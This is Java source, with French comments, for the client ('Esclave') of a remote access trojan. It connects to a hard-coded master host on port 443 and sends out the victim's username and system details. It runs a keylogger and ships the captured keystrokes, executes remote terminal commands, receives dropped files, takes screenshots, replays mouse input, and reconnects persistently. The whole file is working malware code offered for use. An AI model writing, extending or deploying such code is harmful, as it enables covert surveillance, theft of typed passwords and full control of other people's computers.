package client;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.Paths;

import javax.swing.ImageIcon;

import remote.action.ActionVNC;
import remote.action.Keylogging;
import remote.action.Notification;
import remote.action.ScreenShot;
import remote.action.Terminal;
import send.specific.object.ReceivedSpecificObject;
import send.specific.object.SendSpecificObject;
import constante.Constante;

/**
 * 		Gestion et coordination des différentes fonctionnalités de l'esclave
 * 
 * @author lh
 *
 */

public class Esclave {
/**********************************************************************************************************************************************/
/*													   ARGUMENT																	   			   /	
/**********************************************************************************************************************************************/
	
	
	private final int _portMaitre = 443;									// Port de la machine distante
	private final String _addresseMaitre = "192.168.1.40";				// Addresse IP de la machine distante
	private InetAddress _addresse;

	private  ObjectInputStream _in;										// Flux d'entree
	private ObjectOutputStream _out;										// Flux de sortie

	private Socket _s;
	private Keylogging _klgg;
	private Robot _robot;
	private Terminal _terminal = null;

	
/********************************************************************************************************************************************/
/*													   CONSTRUCTEUR																	   			   /	
/**********************************************************************************************************************************************/
	public Esclave() throws ClassNotFoundException, InterruptedException, IOException, AWTException {

		
			
			connect();
				
			
	}

	
	
	

/********************************************************************************************************************************************/
/*													   METHODES																	   			   /	
/**********************************************************************************************************************************************/

	
	
	
	private boolean connect() throws IOException, AWTException, ClassNotFoundException, InterruptedException 
	{
		try {
			_s = new Socket(_addresseMaitre, _portMaitre);
		
		_out = new ObjectOutputStream(_s.getOutputStream());

		_in = new ObjectInputStream(new BufferedInputStream(
				_s.getInputStream()));

		_addresse = _s.getInetAddress();
		
		String fileseparator = System.getProperty("file.separator"), username = System // Initialise
																						// les
																						// proprietes
				.getProperty("user.name"), os_version = System 							// du système
																// esclave
				.getProperty("os.version"), os_name = System
				.getProperty("os.name"), os_arch = System
				.getProperty("os.arch"), user_country = System
				.getProperty("user.country");

		_out.writeObject(_addresse + "++" + fileseparator + "++"
				+ username 																// Envoi les proprietes au Maitre
				+ "++" + os_version + "++" + os_name + "++" + os_arch + "++"
				+ user_country);

		_out.flush();
		} catch (Exception e){
			return false;
		}
		_klgg = new Keylogging(); 				// Appelle le constructeur d'un nouveau
												// keylogger
		_robot = new Robot(); // Instancie un robot
		this.receive(this); // Instancie la reception des donnees
		return true;
		
	}
	/**
	 * Fonction qui prend en charge les flux de données entre le maitre et l'esclave
	 * @param esclave
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void receive(final Esclave esclave) throws ClassNotFoundException,
			IOException, InterruptedException {
		Thread recevoir = new Thread("Receive") {
			@Override
			public void run() {
				Object action;
				try {
					while (true) {

						action = _in.readObject();												// Recupere les objets du socket
						if (action instanceof Integer) 											// Gere les differents objets recus
																								// En utilisant des codes
						{
							Integer code = (Integer) action;									
							if (code.equals(Constante.code_keylog)) 							// Code pour recuperer un fichier avec la saisie
							{
								sendfileKeylog();

							}
							else if (code.equals(Constante.code_notif))							// Code pour afficher une notification
							{
								Object string = _in.readObject();
								if(string instanceof String)
								{
									Notification notif = new Notification((String) string);

								}
							}
							else if (code.equals(Constante.code_cmd)) 							// Code pour lancer une commande terminal
							{
								// System.out.println("[debug] Nouveau requete CMD: ");

								if (_terminal == null) 
								{
									_terminal = new Terminal();
								}
								action = _in.readObject();
								if (action instanceof String) 										// Recupere l'instruction
								{
									String instruction = (String) action;
									String res = "";
									res =_terminal.nouvellecommande(instruction,
											esclave);

									if (!res.equals(Constante.code_message_cmd)) 					// Renvoit l'instruction
									{
										_out.writeObject(Constante.code_cmd);
										_out.flush();
										_out.writeObject(res);
										_out.flush();
									}
								}
							} 
							else 
							{
							
								ReceivedSpecificObject.receivedFileInDirectory((Integer) action, _in,	// Enregistre le fichier dans le dossier courant 
										( _terminal == null ) ? 												// de l'executable ou
																										// Dans le dossier courant correspondant au dossier 
																										// du CMD
												
												Paths.get("").toAbsolutePath().toString()
												+ System.getProperty("file.separator")
												:
													_terminal.getDirectory() + System.getProperty("file.separator"));
							}
						} 
						else if (action instanceof ActionVNC) 									// Reception d'une requete pour VNC
						{
							ActionVNC remoteaction = (ActionVNC) action;

							if (remoteaction instanceof ScreenShot) 
							{
								System.out.println("[debug] Esclave: Reception ScreenShot par l'esclave");

								ScreenShot screenshot = (ScreenShot) remoteaction;
								ImageIcon result = screenshot.executer(_robot);

								if (result != null) 
								{
										System.out.println("[debug] Esclave: Envoit code pour un screen");
										_out.writeObject(Constante.code_vnc);
										_out.flush();
										this.join();

									//	System.out.println("[debug] sendImage: Envoit tailleImage");
										_out.writeObject(result);
										System.out.println("[debug] sendImage: Envoit image");
										_out.flush();
										_out.reset();
								}
							}
							else 
							{
								Object result = remoteaction.executer(_robot);
								System.out.println("[debug] Esclave: Reception d'un CliquerSouris ou BougerSouris par l'esclave");

							}

						}
					}

				} catch (ClassNotFoundException | IOException
								| AWTException | InterruptedException e1) {
					try {
						while(!connect()){
							
								Thread.sleep(2000);						// Fait une pause de 10 sec avant de se reconnecter
							
						}
					} catch (InterruptedException | ClassNotFoundException | IOException | AWTException e2) {
						// TODO Auto-generated catch block
					}
			}
		}
		};
		recevoir.start();
	}

	

	public ObjectOutputStream getOut() {
		return _out;
	}

	
	
	
	
	/**
	 * Envoyer le fichier de Keylog au Maitre et relancer un nouveau keylogger
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void sendfileKeylog() throws IOException, InterruptedException {
		String chemin = _klgg.getCheminFile();
		_klgg.arreteKeylog();
		SendSpecificObject.sendTxt("keylogger",chemin, _out);
		_klgg.supprimerFichier();
		_klgg = new Keylogging();
	}

	
	
	/**
	 * Main de l'esclave
	 * @param args
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 * @throws AWTException
	 */
	public static void main(String[] args) throws ClassNotFoundException,
			IOException, InterruptedException, AWTException {
		new Esclave();
	}
}
